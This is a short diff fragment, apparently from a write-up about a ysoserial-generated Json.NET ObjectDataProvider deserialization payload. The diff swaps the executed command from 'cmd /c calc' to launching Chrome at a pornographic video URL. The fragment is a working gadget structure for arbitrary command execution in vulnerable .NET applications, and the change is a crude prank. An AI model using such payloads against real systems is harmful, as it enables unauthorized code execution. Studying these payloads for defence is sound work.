@@ -19,8 +19,8 @@ To generate it, I used the following command: `ysoserial.exe -f Json.Net -g Obje
         "MethodParameters": {
             "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
             "$values": [
-                "cmd",
-                "/c calc"
+                "chrome",
+                "/c https://www.pornhub.com/view_video.php?viewkey=ph5a74ee77d1c7b"
             ]
         },
         "ObjectInstance": {
